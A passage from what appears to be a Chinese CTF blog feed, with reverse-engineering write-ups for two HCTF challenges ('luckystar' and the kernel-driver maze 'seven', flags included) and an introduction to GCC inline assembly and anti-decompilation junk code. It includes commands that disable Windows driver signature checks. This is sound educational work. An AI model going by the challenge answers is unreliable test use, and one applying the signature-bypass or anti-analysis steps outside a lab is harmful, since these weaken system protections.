class="number">0x12cc</span>,<span class="number">0x3a31</span>,<span class="number">0x6da5</span>,<span class="number">0x2cd0</span>,<span class="number">0x1f68</span>,<span class="number">0x4144</span>,<span class="number">0x10f7</span>,<span class="number">0x5b76</span>,<span class="number">0x2de</span>,<span class="number">0x1ceb</span>,<span class="number">0x6f2c</span>,<span class="number">0x639e</span>,<span class="number">0x1f54</span>,<span class="number">0x5102</span>,<span class="number">0x3dbd</span>,<span class="number">0x21ad</span>,<span class="number">0x292a</span>,<span class="number">0x23b8</span>,<span class="number">0x402d</span>,<span class="number">0x48e2</span>,<span class="number">0x4d30</span>,<span class="number">0x7af0</span>,<span class="number">0x3fe4</span>,<span class="number">0x4bdf</span>,<span class="number">0x717</span>,<span class="number">0x28e7</span>,<span class="number">0x363b</span>,<span class="number">0x2e65</span>,<span class="number">0x3c26</span>,<span class="number">0x6c17</span>,<span class="number">0x5cd4</span>,<span class="number">0x245f</span>,<span class="number">0x6e2e</span>,<span class="number">0x265c</span>,<span class="number">0x182c</span>,<span class="number">0x2222</span>,<span class="number">0x1ac0</span>,<span class="number">0xf56</span>,<span class="number">0x7073</span>,<span class="number">0x41f3</span>,<span class="number">0x1a9d</span>,<span class="number">0x660e</span>,<span class="number">0xc9b</span>,<span class="number">0x22c9</span>,<span class="number">0x156e</span>,<span class="number">0x65dc</span>,<span class="number">0x63af</span>,<span class="number">0x2455</span>,<span class="number">0x5db6</span>,<span class="number">0x288</span>,<span class="number">0x1866</span>,<span class="number">0x2440</span>,<span class="number">0x4904</span>,<span class="number">0x2faf</span>,<span class="number">0x32f8</span>,<span class="number">0x20b4</span>,<span class="number">0x586d</span>,<span class="number">0x3768</span>,<span class="number">0x2d30</span>,<span class="number">0x641d</span>,<span class="number">0x4539</span>,<span class="number">0x6428</span>,<span class="number">0x4c2</span>,<span class="number">0x1e31</span>,<span class="number">0x45dd</span>,<span class="number">0x1e3</span>,<span class="number">0x47e0</span>,<span class="number">0xe2e</span>,<span class="number">0x1f2a</span>,<span class="number">0x7a74</span>,<span class="number">0x5008</span>,<span class="number">0x2262</span>,<span class="number">0x55c3</span>,<span class="number">0x113f</span>,<span class="number">0x1f20</span>,<span class="number">0x30f1</span>,<span class="number">0x13d4</span>,<span class="number">0x215</span>,<span class="number">0x12c4</span>,<span class="number">0x2dd3</span>,<span class="number">0x1701</span>,<span class="number">0x758</span>,<span class="number">0x61df</span>,<span class="number">0x21c</span>,<span class="number">0x3a9d</span>,<span class="number">0xb5f</span>,<span class="number">0x1878</span>,<span class="number">0x6880</span>,<span class="number">0x721d</span>,<span class="number">0x91b</span>,<span class="number">0x5cf</span>,<span class="number">0x7316</span>,<span class="number">0x47cc</span>,<span class="number">0x5ffb</span>,<span class="number">0x50a9</span>,<span class="number">0x1e5c</span>,<span class="number">0x33c0</span>,<span class="number">0x1f0e</span>,<span class="number">0x25e8</span>,<span class="number">0x157c</span>,<span class="number">0x5f0c</span>,<span class="number">0xb68</span>,<span class="number">0x355e</span>,<span class="number">0xbcd</span>,<span class="number">0x2737</span>,<span class="number">0x65c6</span>,<span class="number">0x70e3</span>,<span class="number">0x4f9d</span>,<span class="number">0x75ed</span>,<span class="number">0x3375</span>,<span class="number">0x41a5</span>,<span class="number">0x7a2e</span>,<span class="number">0x40f5</span>,<span class="number">0xe6f</span>,<span class="number">0x27c0</span>,<span class="number">0x60fe</span>,<span class="number">0x4663</span>,<span class="number">0x40c8</span>,<span class="number">0x780f</span>,<span class="number">0x2c4b</span>,<span class="number">0x590f</span>,<span class="number">0x2f48</span>,<span class="number">0x2c41</span>,<span class="number">0x36d7</span>,<span class="number">0x5145</span>,<span class="number">0x575a</span>,<span class="number">0x792f</span>,<span class="number">0x1ae9</span>,<span class="number">0x75be</span>,<span class="number">0x6424</span>,<span class="number">0x1f6c</span>,<span class="number">0x1094</span>,<span class="number">0x70cf</span>,<span class="number">0x1ef8</span>,<span class="number">0x2a1e</span>,<span class="number">0x13b</span>,<span class="number">0x25e1</span>,<span class="number">0x3eeb</span>,<span class="number">0x100d</span>,<span class="number">0x7455</span>,<span class="number">0x7b21</span>,<span class="number">0x5bc3</span>,<span class="number">0x6afa</span>,<span class="number">0x396e</span>,<span class="number">0x6b79</span>,<span class="number">0x817</span>,<span class="number">0x3932</span>,<span class="number">0x736e</span>,<span class="number">0x74be</span>,<span class="number">0x56b1</span>,<span class="number">0x5d63</span>,<span class="number">0x691e</span>,<span class="number">0x362b</span>,<span class="number">0x4f37</span>,<span class="number">0x50ad</span>,<span class="number">0x3ee8</span>,<span class="number">0x530e</span>,<span class="number">0x160b</span>,<span class="number">0x3afc</span>,<span class="number">0x7ddf</span>,<span class="number">0x6dc1</span>,<span class="number">0x4b6f</span>,<span class="number">0x6596</span>,<span class="number">0xbff</span>,<span class="number">0x4edc</span>,<span class="number">0x65ed</span>,<span class="number">0x3bf0</span>,<span class="number">0x79b5</span>,<span class="number">0xca9</span>,<span class="number">0xbf6</span>,<span class="number">0x4ec6</span>,<span class="number">0x48a2</span>,<span class="number">0x46d8</span>,<span class="number">0x30c9</span>,<span class="number">0xd6a</span>,<span class="number">0xf9c</span>,<span class="number">0x4a74</span>,<span class="number">0x7896</span>,<span class="number">0x295d</span>,<span class="number">0x1ff5</span>,<span class="number">0x3216</span>,<span class="number">0x27e3</span>,<span class="number">0x581c</span>,<span class="number">0x1000</span>,<span class="number">0x5659</span>,<span class="number">0x2230</span>,<span class="number">0x673c</span>,<span class="number">0x4ed2</span>,<span class="number">0x228d</span>,<span class="number">0x3bd6</span>,<span class="number">0x56b9</span>,<span class="number">0x2546</span>,<span class="number">0x21b0</span>,<span class="number">0x6335</span>,<span class="number">0x6d8c</span>,<span class="number">0x4844</span>,<span class="number">0x579a</span>,<span class="number">0x650e</span>,<span class="number">0x7c7b</span>,<span class="number">0x6042</span>,<span class="number">0x3a77</span>,<span class="number">0x502e</span>,<span class="number">0x4335</span>,<span class="number">0x2a0a</span>,<span class="number">0x607a</span>,<span class="number">0x3c4d</span>,<span class="number">0x2b9e</span>,<span class="number">0x14be</span>,<span class="number">0x35d0</span>,<span class="number">0x7835</span>,<span class="number">0x4f68</span>,<span class="number">0x11a</span>,<span class="number">0x4ed3</span>,<span class="number">0x6327</span>,<span class="number">0x7be3</span>,<span class="number">0x5fa</span>,<span class="number">0x2a81</span>,<span class="number">0x757a</span>,<span class="number">0x2816</span>,<span class="number">0x5e1c</span>,<span class="number">0x792c</span>,<span class="number">0x3c85</span>,<span class="number">0x110e</span>,<span class="number">0x6326</span>,<span class="number">0x3b72</span>,<span class="number">0x4dbf</span>,<span class="number">0x7076</span>,<span class="number">0x39eb</span>,<span class="number">0x4d70</span>,<span class="number">0x7525</span>,<span class="number">0x168</span>,<span class="number">0x13ea</span>,<span class="number">0x3233</span>,<span class="number">0x22dc</span>,<span class="number">0x4783</span>,<span class="number">0x2a17</span>,<span class="number">0x336f</span>,<span class="number">0x5c18</span>,<span class="number">0x4c3e</span>,<span class="number">0x54df</span>,<span class="number">0x2974</span>,<span class="number">0x333c</span>,<span class="number">0x467b</span>,<span class="number">0x6566</span>,<span class="number">0x7f5d</span>,<span class="number">0xb43</span>,<span class="number">0x6060</span>,<span class="number">0x2413</span>,<span class="number">0x478b</span>,<span class="number">0x2a5e</span>,<span class="number">0xf62</span>,<span class="number">0x184e</span>,<span class="number">0x7452</span>,<span class="number">0x5fde</span>,<span class="number">0x32a2</span>,<span class="number">0x7d88</span>,<span class="number">0x8f1</span>,<span class="number">0x4155</span>,<span class="number">0x6b7d</span>,<span class="number">0x97c</span>,<span class="number">0x56c8</span>,<span class="number">0x42f8</span>,<span class="number">0x645e</span>,<span class="number">0x67b5</span>,<span class="number">0x1ac5</span>,<span class="number">0x2f48</span>,<span class="number">0x79d7</span>,<span class="number">0xe51</span>,<span class="number">0xf20</span>,<span class="number">0x41f2</span>,<span class="number">0x79f1</span>,<span class="number">0x5004</span>,<span class="number">0x4548</span>,<span class="number">0x69f3</span>,<span class="number">0x6dc0</span>,<span class="number">0x4f60</span>,<span class="number">0x5c1d</span>,<span class="number">0x76ff</span>,<span class="number">0x213a</span>,<span class="number">0x3753</span>,<span class="number">0x665f</span>,<span class="number">0x3624</span>,<span class="number">0x5d49</span>,<span class="number">0x5cf1</span>,<span class="number">0x1566</span>,<span class="number">0x41ab</span>,<span class="number">0x81e</span>,<span class="number">0x2e73</span>,<span class="number">0x7c14</span>,<span class="number">0x83f</span>,<span class="number">0x1fc9</span>,<span class="number">0x1380</span>,<span class="number">0x7e09</span>,<span class="number">0x4f51</span>,<span class="number">0x4306</span>,<span class="number">0x22ac</span>,<span class="number">0x3f15</span>,<span class="number">0x34ba</span>,<span class="number">0x3c5a</span>,<span class="number">0x503f</span>,<span class="number">0x26f3</span>,<span class="number">0x73a2</span>,<span class="number">0x435f</span>,<span class="number">0x7a37</span>,<span class="number">0x4d34</span>,<span class="number">0x70a1</span>,<span class="number">0x685c</span>,<span class="number">0x7590</span>,<span class="number">0x6179</span>,<span class="number">0x5125</span>,<span class="number">0x5e19</span>,<span class="number">0xc2</span>,<span class="number">0x63e5</span>,<span class="number">0x2214</span>,<span class="number">0x15f2</span>,<span class="number">0x3f8c</span>,<span class="number">0x41d2</span>,<span class="number">0x51b2</span>,<span class="number">0x6229</span>,<span class="number">0x23f0</span>,<span class="number">0x2ac3</span>,<span class="number">0xc4</span>,<span class="number">0x1281</span>,<span class="number">0x687f</span>,<span class="number">0x319a</span>,<span class="number">0x6ef6</span>,<span class="number">0x3f08</span>,<span class="number">0x7fd6</span>,<span class="number">0xe0c</span>,<span class="number">0x67a</span>,<span class="number">0x3534</span>,<span class="number">0x1d69</span>,<span class="number">0x1251</span>,<span class="number">0x4af2</span>,<span class="number">0x3b31</span>,<span class="number">0x3b7f</span>,<span class="number">0x2920</span>,<span class="number">0x2f90</span>,<span class="number">0x1d7a</span>,<span class="number">0x427e</span>,<span class="number">0x6fda</span>,<span class="number">0x187b</span>,<span class="number">0x3aa7</span>,<span class="number">0x3569</span>,<span class="number">0x4106</span>,<span class="number">0xb75</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">enc = [<span class="number">0x49</span>,<span class="number">0xE6</span>,<span class="number">0x57</span>,<span class="number">0xBD</span>,<span class="number">0x3A</span>,<span class="number">0x47</span>,<span class="number">0x11</span>,<span class="number">0x4C</span>,<span class="number">0x95</span>,<span class="number">0xBC</span>,<span class="number">0xEE</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0xA0</span>,<span class="number">0xF0</span>,<span class="number">0xDE</span>,<span class="number">0xAC</span>,<span class="number">0xF2</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0x83</span>,<span class="number">0x49</span>,<span class="number">0x6E</span>,<span class="number">0xA9</span>,<span class="number">0xA6</span>,<span class="number">0xC5</span>,<span class="number">0x67</span>,<span class="number">0x3C</span>,<span class="number">0xCA</span>,<span class="number">0xC8</span>,<span class="number">0xCC</span>,<span class="number">0x05</span>]</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">tar = []</span><br><span class="line">v16 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(token):</span><br><span class="line">    v16 = <span class="number">6</span></span><br><span class="line">    <span class="keyword">while</span> v16 &gt; -<span class="number">2</span>:</span><br><span class="line">        v17 = token[i] % <span class="number">4</span></span><br><span class="line">        v18 = v16</span><br><span class="line">        v16 -= <span class="number">2</span></span><br><span class="line">        res = ((v17 &amp; <span class="number">0xff</span>) &lt;&lt; (v18 &amp; <span class="number">0xff</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        tar.append(res)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(enc):</span><br><span class="line">    temp = enc[i]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">3</span>]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">2</span>]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">1</span>]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">0</span>]</span><br><span class="line">    k += <span class="number">4</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(temp)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar5.png"
                      alt="image"
                ></p>
<p>利用 BASE64 解码(注意更换表盘)，即可拿到flag。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar6.png"
                      alt="image"
                ></p>
<p>flag： <strong>hctf{1zumi_K0nat4_Mo3}</strong></p>
<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>这道题目涉及到一些反调试手段和动态代码解密、以及 TLS 等知识，做题时还是要有耐心，这道题我调了很久才做出来(恶心到了。。。)中间放弃了一段时间，做出来之后发现其实没有那么难。  </p>
<p>PS： 吐槽一下配的音乐，真的太魔性了 ORZ。。。</p>
<h2 id="seven"><a href="#seven" class="headerlink" title="seven"></a>seven</h2><h3 id="双机调试"><a href="#双机调试" class="headerlink" title="双机调试"></a>双机调试</h3><p>这是一道 Windows 64位的驱动逆向题目，之前没有做过关于驱动的逆向，做完这道题感觉驱动其实和一般的可执行程序类似，最主要的区别就是驱动和系统内核是有关系的，它需要先被加载到内核中，才能够随着内核一起运行。<br>在静态分析方面，驱动涉及到一些特殊的函数，主要的算法逻辑没有什么太大的变化，需要注意的一点是函数参数，因为在运行驱动的时候调用的函数是 iocalldriver 等，参数在静态分析时不好发现，于是需要结合动态调试手段。<br>之前说驱动和一般的可执行程序不一样就体现在调试的方法上，由于驱动是和内核绑在一块的，所以我们得调试系统内核，把操作系统看成一个软件，驱动只是这个软件中的一小部分。<br>调试 windows 内核微软官方给出的推荐就是 双机调试，即拿来两台电脑，一台作为调试者，另一台最为目标机器，在调试机上面使用 windbg 通过某些连接方式对另一台机器的操作系统进行调试，两台电脑的开销太高了，现在最常用的调试内核的手段就是 主机 + 虚拟机，虚拟机推荐使用 VMware。<br>首先搭建内核的调试环境，<a class="link"   href="https://blog.csdn.net/sagittarius_warrior/article/details/51305046" >参考博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>博客给出的步骤已经很详细了，大致分为：</p>
<ol>
<li>配置虚拟机的管道，通过新增串口为虚拟机添加管道。</li>
<li>配置主机的 windbg 启动选项，可以通过快捷方式参数来实现。</li>
<li>配置虚拟机的开机引导项，新增调试模式。</li>
<li>以调试模式启动虚拟机，并在<strong>启动过程中</strong>使用 windbg 附加上去。</li>
</ol>
<p>环境搭建并不困难，重点是接下来的调试过程，由于调试的是驱动，那么首先要把它安装好，可以使用 cmd 命令直接安装，也可以使用工具 OSRLoader，这个工具图形化操作比较方便。<br>在加载驱动之前，先要取消系统对驱动数字签名的验证，并设置一些其他的东西，可以参考以下命令：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bcdedit /copy &#123;current&#125; /d &quot;Windwos7&quot; 建立一个新的启动项。</span><br><span class="line">bcdedit /debug ON</span><br><span class="line">bcdedit /bootdebug ON 设置新的启动项。</span><br><span class="line">bcdedit /dbgsettings 查看当前的调试配置：</span><br><span class="line">bcdedit /timeout 10 选择菜单的超时，我设置为10秒</span><br><span class="line">bcdedit -set TESTSIGNING on 设置允许加载不受信任的驱动</span><br></pre></td></tr></table></figure></div>

<p>如果使用命令行，可以用 sc :</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc query type= driver 可以查看驱动列表</span><br><span class="line">sc create &lt;起个名字&gt; binPath= &lt;驱动路径&gt; type= &lt;驱动模式，一般是 kernel&gt;  这条命令加载一个驱动</span><br><span class="line">sc stop &lt;驱动名字&gt;  停止一个驱动</span><br><span class="line">sc delete &lt;驱动名字&gt;  删除一个驱动</span><br></pre></td></tr></table></figure></div>
<h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>首先将 windbg 附加到虚拟机上，如果不出意外的话，控制台应该会显示以下内容：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven1.png"
                      alt="image"
                ></p>
<p>现在已经在内核断下，按 F5 键运行，直到虚拟机可以正常操作。<br>接着在 windbg 断下系统(上方工具栏中的按钮)，在控制台输入命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sxe ld seven.sys</span><br></pre></td></tr></table></figure></div>
<p>意思就是当 seven 这个驱动加载起来的时候就自动断下。<br>设置好后继续运行，按照上面的命令把驱动加载起来，如果设置没什么问题，在执行 sc start 之后就会断下来。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven2.png"
                      alt="image"
                ><br>如上图，使用 OSR 软件加载驱动，点击 start 之后就会断下来。</p>
<p>但是断点所在的位置不是驱动的入口点，而是 ntdll.dll 中的某一处，我们需要使用命令 lm 来找到 seven 的入口位置：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven3.png"
                      alt="image"
                ></p>
<p>蓝色方框就是模块的起始地址，结合 IDA 中的偏移量，可以在相应的函数下断点。<br>通过 IDA 分析驱动，发现主要逻辑函数在于 sub_140012f0 ：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400012F0</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  __int16 *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbp</span></span><br><span class="line">  __int16 v8; <span class="comment">// dx</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// dl</span></span><br><span class="line">  CHAR *v10; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(a2 + <span class="number">0x30</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(a2 + <span class="number">0x18</span>);</span><br><span class="line">    v4 = (*(a2 + <span class="number">56</span>) * <span class="number">0xAAAAAAAAAAAAAAAB</span>ui64 &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = dword_1400030E4;</span><br><span class="line">      v6 = (v3 + <span class="number">2</span>);</span><br><span class="line">      v7 = v4;</span><br><span class="line">      <span class="keyword">while</span> ( *(v3 + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_30:</span><br><span class="line">        v6 += <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !--v7 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      &#125;</span><br><span class="line">      aO[v5] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      v8 = *v6;</span><br><span class="line">      <span class="keyword">if</span> ( *v6 == <span class="number">17</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xFFFFFFF0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 -= <span class="number">16</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        &#125;</span><br><span class="line">        v5 += <span class="number">208</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">31</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xFFFFFFF0</span>) == <span class="number">0xD0</span> )</span><br><span class="line">        v5 -= <span class="number">208</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v5 += <span class="number">16</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">      dword_1400030E4 = v5;</span><br><span class="line">LABEL_14:</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xF</span> )</span><br><span class="line">          --v5;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v5 += <span class="number">15</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xF</span>) == <span class="number">15</span> )</span><br><span class="line">          v5 -= <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ++v5;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = aO[v5];</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="string">&#x27;*&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="string">&quot;-1s\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="string">&#x27;7&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">          aO[v5] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = <span class="string">&quot;The input is the flag!\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      dword_1400030E4 = <span class="number">16</span>;</span><br><span class="line">      DbgPrint(v10);</span><br><span class="line">      v5 = dword_1400030E4;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">  <span class="keyword">if</span> ( *(v2 + <span class="number">65</span>) )</span><br><span class="line">    *(*(v2 + <span class="number">184</span>) + <span class="number">3</span>i64) |= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> *(v2 + <span class="number">48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>实际上如果对驱动比较熟悉的话，逻辑并不难，由于驱动加载了 kdbclass.sys：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">v8 = L&quot;\\Driver\\kbdclass&quot;;</span><br></pre></td></tr></table></figure></div>
<p>所以代码中的一些判断都是基于键盘驱动号的，比如 0x11 对应字符 ‘w’ 等等，通过分析得出结论，程序对<br>w a s d 这四个按键进行判断，其他输入不会产生影响。  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">附：键盘的硬件扫描码</span><br><span class="line">https://blog.csdn.net/firas/article/details/26267573</span><br></pre></td></tr></table></figure></div>

<p>确定了断点位置，使用命令 bp fffff880&#96;032a7000+12f0 就可以在关键函数下断点，紧接着 f5 继续运行，当在虚拟机中输入一个字符(在键盘上按下任意一个键)，windbg就会再次断下，这回位置就在关键函数的入口。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven4.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven5.png"
                      alt="image"
                ></p>
<p>接着就可以着手调试了，F10 和 F11 对应着 OD 的 F7 和 F8，通过调试可以理解这个函数的目的，它多次对内置的一个字符数组进行操作，在 IDA 中这个数组是：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven6.png"
                      alt="image"
                ></p>
<p>看上去没什么意义，但是根据经验推断，这个应该是一种迷宫，最后对是否到达字符 ‘7’ 进行验证，猜测是要把 o 移动到 7 的位置，在 windbg 中随便调整了一下宽度，得出了迷宫：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven7.png"
                      alt="image"
                ></p>
<p>一个 7 型迷宫，使用 wasd 操控 o 走到 7 就胜利了！<br>走一波记录下来每一步的操作，到最后一步的时候单步调试，查看 Dbgprint 函数的参数就是 The input is the flag!，表示输入正确。  </p>
<p>flag: <strong>hctf{ddddddddddddddssaasasasasasasasasas}</strong></p>
<h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>调试驱动这是第一次，把环境搭好之后就可以像调试正常可执行程序一样调试内核和驱动了。<br>这道题目的数组应该是一维的，导致静态分析难一些，动态调试就很简单。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>De-DeCompiler</title>
    <url>/2018/11/02/dedecompiler/</url>
    <content><![CDATA[<p>简单的花指令。</p>
<span id="more"></span>

<h2 id="GCC-简单的内联汇编"><a href="#GCC-简单的内联汇编" class="headerlink" title="GCC 简单的内联汇编"></a>GCC 简单的内联汇编</h2><p>GCC 支持在代码中嵌入汇编代码，这些代码被称为“GCC内联汇编”。  </p>
<p>内联汇编不只有 GCC 支持，包括微软的 VS 和其他一些编译器也支持内联汇编，GCC的内联汇编语法比较简单，格式如下：  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm__ [__volatile__] (&quot;指令序列&quot;)</span><br></pre></td></tr></table></figure></div>
<ol>
<li>__asm__ 是 GCC 内联汇编(asm 宏)的关键字，使用它来声明一个内联汇编。 </li>
<li>__volatile__ 是 volatile 的宏定义，它是可选的，用来告诉编译器不要优化或更改下面一段代码。</li>
<li>指令序列：主要的汇编指令内容，其基本的编写规则：<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">规则1:任意两条指令之间要么被分号(;)或换行符(\n)或(\n\t)分隔开,要么单独放在两行;</span><br><span class="line">规则2:单独放在两行的方法既可以通过\n或\n\t的方法来实现,也可以真正地放在两行;</span><br><span class="line">规则3:可以使用1对或多对双引号,每1对双引号里面可以放1条或多条指令,所有的指令都要放在双引号中;</span><br><span class="line">比较简单的写法：</span><br><span class="line">__asm__(&quot;movl $1,%eax\n\t&quot;\</span><br><span class="line">        &quot;xor %ebx,%ebx\n\t&quot;\</span><br><span class="line">        &quot;int $0x80&quot;);</span><br></pre></td></tr></table></figure></div>
内联汇编还有很多知识点，这里暂时不涉及。<br>PS: 关于 ASM 宏的源代码可以在<a class="link"   href="https://code.woboq.org/linux/linux/arch/x86/include/asm/asm.h.html" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>找到。</li>
</ol>
<h2 id="反-反编译"><a href="#反-反编译" class="headerlink" title="反-反编译"></a>反-反编译</h2><p>最近看雪学院(公众号)发了一篇关于反-反编译的文章(翻译自 <strong>Static Analysis of Artefacts Handbook</strong>)，看完感觉受益匪浅，由于一直以来反编译都是我分析软件必须要使用的，拿来一个软件，首先做的就是拖进 IDA 按下 F5 ，大佬们都说不要依赖 F5 ，因为早晚会碰到F5没法用的时候，看过这篇文章，才真正感觉到这里面的套路之深 ORZ…稍微总结一下学到的东西。</p>
<p>什么是反编译就不用多说了， IDA 的核心功能 F5 就是一个反编译器，它能够将汇编代码转换成伪 C 代码，极大地提高了逆向工作者的工作效率，反编译器还有很多，包括开源的 RETDEC、JEB、Reflector等等。<br>JAVA 以及 Python 等语言的反编译比较简单，但是 C 和 C++ 等语言反编译起来就比较困难了，这是由语言特性和编译器所决定的，例如几乎无法从 RUST 的反编译结果中提取到有用的信息。<br>软件的开发者自然不希望自己的劳动成果轻易的就可以被别人分析剽窃，所以针对反编译技术就出现了反-反编译技术。通过反-反编译技术，开发者可以使逆向人员的工作量提升，结合加壳和代码混淆技术，能够软件更加安全(<strong>但是一切软件都是可以被破解的，只是时间问题，如果某种保护手段能够使软件在它的生命周期里不被破解，那么这种手段就是成功的</strong>)。<br>简述 IDA 的反编译：目前最常用的反编译器就是Hex-ray decompiler了，所以以它为例，反编译的思想和设计的技术非常复杂，涵盖了很多的知识，但是可以简单的理解一下，IDA 在反编译程序的时候维护了一个虚拟的栈(模拟运行程序？)，通过解析程序的逻辑流程(顺序、分支、循环形成 CFG)，将汇编代码进行复杂的转化，最后为变量分配名字和寄存器，优化出伪代码，反-反编译就是要针对反编译的流程，找到可以利用的弱点。</p>
<p>实际上，这些额外的垃圾代码通常称为 <strong>花指令</strong>。</p>
